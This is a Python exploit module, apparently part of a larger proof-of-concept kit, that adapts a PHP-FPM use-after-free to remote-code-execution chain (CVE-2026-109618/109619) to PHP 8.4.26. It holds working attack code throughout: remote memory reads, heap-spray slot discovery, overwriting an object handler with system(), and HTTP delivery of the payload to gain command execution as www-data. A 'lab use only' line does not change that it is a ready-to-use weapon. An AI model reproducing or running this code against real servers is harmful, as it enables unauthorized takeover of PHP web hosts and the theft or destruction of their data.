#!/usr/bin/env python3
# INDEX: monkeypatch shim porting uaf->rce fire to 8.4.26 | fpm | pure | serialize+unserialize | free | given binbase
"""Reusable monkeypatch shim that ports the UAF->RCE fire from 8.5.11 to PHP
8.4.26, so the stock fpm RCE driver lands uid=www-data on 8.4.26-fpm unchanged.
CVE-2026-109618 / CVE-2026-109619.

Reassigns three attributes on the shared engine module to cover the 8.4.26
deltas: the stdClass class-entry lookup (resolve zend_standard_class_def by
gnu_hash instead of walking EG.class_table), the spray-slot probe (an
info-agnostic 320-stride live-slot scan), and the fire geometry
(get_properties_for at handler offset 0xC0 for the 200-byte handler table).
Call install(remote_rce, binbase) once; it returns a token whose .restore()
undoes the patches. Pure stdlib, safe under python3 -I. Lab/analysis use only.
"""
from __future__ import annotations

import importlib.util
import os
import struct
import sys
import time

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(_HERE)  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)


def _load_dispatch(name, relpath):
    """Load a canonical dispatch primitive by its poc-root-relative path."""
    path = os.path.join(_POC_ROOT, relpath)
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


_dispatch_spray = _load_dispatch("dispatch_spray", "primitives/dispatch/spray_slot.py")
_dispatch_fire = _load_dispatch("dispatch_fire", "primitives/dispatch/fire.py")

# get_properties_for = last field of zend_object_handlers = sizeof - 8.
# 8.4.26: sizeof(std_object_handlers) == 200 -> 192 (0xC0).
# (readelf -sW php-fpm; re-derive per build. 8.5.11 would be 200.)
GPF_HANDLER_OFF = 192


# stdClass ce via the zend_standard_class_def exported symbol
def _read_ptr_bss(remote_rce, eg, target):
    """Read one qword at `target` (a .bss pointer slot) by sweeping fake-string
    anchors through the executor_globals region -- the proven-readable BSS
    neighbourhood -- and accepting a window that spans target+8. Offset-free:
    both `eg` and `target` come from gnu_hash; no struct offset is assumed."""
    # Try the empirically-proven anchor (EG-0x790) first, then sweep outward,
    # so the common case is a couple of requests, not hundreds.
    order = [-0x790] + [o for o in range(-0x1000, 0x400, 8) if o != -0x790]
    for scan_off in order:
        fs = eg + scan_off
        data_start = fs + 0x18
        if data_start > target:
            continue
        need = (target - data_start) + 8
        r = remote_rce.isstring_read(fs, timeout=4)
        if r is None:
            continue
        slen, sdata = r
        if slen < need or len(sdata) < need:
            continue
        return struct.unpack_from('<Q', sdata, target - data_start)[0]
    return None


def _ce_name_is_stdclass(remote_rce, ce):
    """Confirm ce->name (zend_class_entry.name at +0x08) reads "stdClass"."""
    namep = None
    for k in (0x18, 0x20, 0x28):
        r = remote_rce.isstring_read(ce + 0x08 - k, timeout=4)
        if r and r[0] >= (k - 0x18) + 8 and len(r[1]) >= (k - 0x18) + 8:
            namep = struct.unpack_from('<Q', r[1], k - 0x18)[0]
            break
    if not namep or not (0x10000 < namep < remote_rce.ADDR_MAX):
        return False
    rn = remote_rce.isstring_read(namep, timeout=4)
    return bool(rn and rn[0] == 8 and rn[1][:8] == b"stdClass")


def make_lookup_class_table(binbase, verbose=True):
    """Return a drop-in replacement for lookup_class_table(eg, name) that
    resolves the stdClass ce on 8.4.26 via the zend_standard_class_def symbol,
    bypassing the 8.5.x-only EG.class_table walk. `binbase` is captured; the
    `eg` the caller passes is reused as the BSS read anchor, and `name` is
    accepted for signature compatibility (validated as stdClass)."""
    def lookup_class_table_8426(eg, name):
        print("\n[Phase R-5*] stdClass ce via zend_standard_class_def symbol "
              "(8.4.26 shim)")
        # eg is resolved from binbase by run_fpm_chain; re-resolve defensively
        # so the shim is correct even if called with a stale eg.
        try:
            eg_r = remote_rce_mod.gnu_hash_resolve(binbase, "executor_globals")
        except Exception:
            eg_r = eg
        anchor_eg = eg_r or eg
        try:
            csd_addr = remote_rce_mod.gnu_hash_resolve(binbase, "zend_standard_class_def")
        except RuntimeError as e:
            print(f"  R-5* FAILED: zend_standard_class_def resolve: {e}")
            return None
        if verbose:
            print(f"  executor_globals         = 0x{anchor_eg:x}")
            print(f"  &zend_standard_class_def = 0x{csd_addr:x}")
        for _ in range(4):
            ce = _read_ptr_bss(remote_rce_mod, anchor_eg, csd_addr)
            if ce and 0x10000 < ce < remote_rce_mod.ADDR_MAX:
                if _ce_name_is_stdclass(remote_rce_mod, ce):
                    if verbose:
                        print(f"  stdClass ce = 0x{ce:x}  (ce->name == 'stdClass')")
                    return ce
        print("  R-5* FAILED: stdClass ce resolve/validate failed")
        return None
    # remote_rce_mod is bound in install(); referenced lazily so this factory
    # needs no module handle itself.
    lookup_class_table_8426._needs_remote_rce = True
    return lookup_class_table_8426


# info-agnostic spray-slot probe
def make_find_spray_slot(verbose=True):
    """Return a drop-in replacement for find_spray_slot(heap_ref) that scans
    every page at the 320-byte stride for a live 280-length slot, so a
    freed-run (chunk-map info==0) page the spray reclaimed is still found."""
    def find_spray_slot_8426(heap_ref):
        chunk = heap_ref & ~0x1FFFFF
        if verbose:
            print(f"\n[Phase R-6*] info-agnostic spray-slot probe "
                  f"(chunk 0x{chunk:x}, 8.4.26 shim)")
        # The freed-arData spray run is deterministic on 8.4.26 (page ~117,
        # slots 4..15); probe that stable band first, then full-scan so a groom
        # shift cannot strand the chain.
        band = list(range(100, 136)) + [pn for pn in range(1, 512)
                                        if pn < 100 or pn >= 136]
        spray_len = remote_rce_mod.SPRAY_LEN
        S = _dispatch_spray.find_spray_slot_scan(
            lambda a: remote_rce_mod.isstring_read(a, timeout=3), chunk,
            match=lambda r: r is not None and r[0] == spray_len,
            band=band, with_offset=False, use_map=None, probe_budget=None)
        if S is not None:
            if verbose:
                addr = S - 0x18
                off = addr - chunk
                pn, slot = off // 0x1000, (off % 0x1000) // 320
                print(f"  spray @ page {pn} slot {slot} 0x{addr:x} "
                      f"-> S=0x{S:x}")
            return S
        print("  R-6* FAILED: no live spray slot found")
        return None
    return find_spray_slot_8426


# fire with get_properties_for at the 8.4.26 handler offset
def make_fire_cmd(gpf_off=GPF_HANDLER_OFF, verbose=True):
    """Return a drop-in replacement for _fire_cmd(ce, system, spray, cmd14)
    that writes system() into get_properties_for at handler offset `gpf_off`
    (192 on 8.4.26) instead of the hardcoded 200. Returns the raw HTTP output
    (bytes or None) exactly like _fire_cmd, so the untouched trigger_rce
    wrapper keeps working."""
    def _fire_cmd_8426(ce_stdclass, system_addr, spray_addr, cmd14):
        # WORKER SURVIVAL: append ';true' (budget-permitting) so the
        # fired command exits 0 -> system() returns 0 -> get_properties_for
        # returns NULL. This keeps the worker alive ONLY when the dispatch sink
        # NULL-checks get_properties_for's return (get_object_vars/(array)/foreach
        # -- `test %rax,%rax; je`). A serialize() echo sink derefs the return via
        # zend_array_count with NO null check, so it SIGSEGVs regardless of the
        # exit code (gdb-verified on 8.4.26 AND 8.5.11; identical call site). Set
        # remote_rce_mod.EXIT0_WRAP = False to restore the original crash-and-spray fire.
        do_wrap = bool(getattr(remote_rce_mod, "EXIT0_WRAP", True)
                       and hasattr(remote_rce_mod, "exit0"))
        payload = _dispatch_fire.build_fire_payload(
            ce_stdclass, system_addr, spray_addr, cmd14, gpf_off,
            spray_len=remote_rce_mod.SPRAY_LEN, spray_count=remote_rce_mod.SPRAY_COUNT,
            c_part=remote_rce_mod.C_PART, ref_base=remote_rce_mod.REF_BASE, exit0_wrap=do_wrap)

        if verbose:
            print(f"  (8.4.26 fire: get_properties_for @ handler+0x{gpf_off:x})")
        output = remote_rce_mod.send_http(payload)
        time.sleep(0.3)
        return output  # bytes or None, exactly like _fire_cmd
    return _fire_cmd_8426


# install / restore
remote_rce_mod = None  # bound by install(); the shimmed functions reference it lazily


class _Token:
    """Returned by install(); .restore() reverts the three patched attributes."""
    def __init__(self, remote_rce, originals):
        self._remote_rce = remote_rce
        self._originals = originals

    def restore(self):
        for name, fn in self._originals.items():
            setattr(self._remote_rce, name, fn)


def install(remote_rce, binbase, gpf_handler_off=GPF_HANDLER_OFF, verbose=True):
    """Patch the shared engine module so its class-entry/spray/fire steps
    land on PHP 8.4.26. `binbase` is the php-fpm PIE base (same value handed
    to the fpm driver's install_fpm_patches / run_fpm_chain). Returns a token
    with .restore(). Idempotent per (remote_rce, binbase): re-calling re-patches
    cleanly.

    Apply AFTER install_fpm_patches() (so the fpm transport/window shims are
    already in place) and BEFORE run_fpm_chain()."""
    global remote_rce_mod
    remote_rce_mod = remote_rce
    originals = {
        "lookup_class_table": getattr(remote_rce, "lookup_class_table", None),
        "find_spray_slot": getattr(remote_rce, "find_spray_slot", None),
        "_fire_cmd": getattr(remote_rce, "_fire_cmd", None),
    }
    remote_rce.lookup_class_table = make_lookup_class_table(binbase, verbose=verbose)
    remote_rce.find_spray_slot = make_find_spray_slot(verbose=verbose)
    remote_rce._fire_cmd = make_fire_cmd(gpf_off=gpf_handler_off, verbose=verbose)
    if verbose:
        print(f"[shim-8426] installed R-5 (zend_standard_class_def), "
              f"R-6 (info-agnostic spray), R-7 (gpf@0x{gpf_handler_off:x}) "
              f"on a7; binbase=0x{binbase:x}")
    return _Token(remote_rce, originals)


def install_on_rce(rce, host, port, path, binbase,
                   gpf_handler_off=GPF_HANDLER_OFF, enum=False, verbose=True):
    """Convenience: run the fpm driver's install_fpm_patches() then install()
    the 8.4.26 fire shims on rce.remote_rce, in the right order. Returns the restore token.
    After this, rce.run_fpm_chain(host, port, path, binbase, cmd, chunk=...)
    fires on 8.4.26-fpm unchanged."""
    rce.install_fpm_patches(host, port, path, binbase, enum=enum)
    return install(rce.remote_rce, binbase, gpf_handler_off=gpf_handler_off,
                   verbose=verbose)
